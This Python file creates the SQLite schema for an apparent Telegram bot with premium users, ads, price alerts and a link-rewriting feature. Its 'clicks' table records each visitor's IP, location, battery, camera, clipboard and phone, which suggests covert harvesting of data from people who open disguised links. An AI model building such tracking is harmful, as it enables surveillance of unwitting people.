import sqlite3

DB_PATH = "bot.db"

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            is_premium INTEGER DEFAULT 0,
            premium_until TEXT,
            joined_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS user_coins (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0
        );
        CREATE TABLE IF NOT EXISTS rewarded_ads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ad_id TEXT,
            watched_at TEXT DEFAULT CURRENT_TIMESTAMP,
            verified INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            symbol TEXT,
            target_price REAL,
            direction TEXT,
            active INTEGER DEFAULT 1,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS ads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            button_text TEXT,
            link TEXT,
            photo_id TEXT,
            duration_hours INTEGER,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            expires_at TEXT,
            active INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS ad_views (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ad_id INTEGER,
            user_id INTEGER,
            viewed_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS whitelist (
            chat_id INTEGER PRIMARY KEY,
            title TEXT,
            added_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS processed (
            update_id INTEGER PRIMARY KEY
        );
        CREATE TABLE IF NOT EXISTS links (
            link_id TEXT PRIMARY KEY,
            user_id INTEGER,
            original_url TEXT,
            modified_url TEXT,
            created_at TEXT,
            clicks INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT,
            ip TEXT,
            user_agent TEXT,
            screen TEXT,
            language TEXT,
            platform TEXT,
            timezone TEXT,
            battery TEXT,
            location TEXT,
            camera TEXT,
            clipboard TEXT,
            phone TEXT,
            timestamp TEXT
        );
    """)
    conn.commit()
    conn.close()
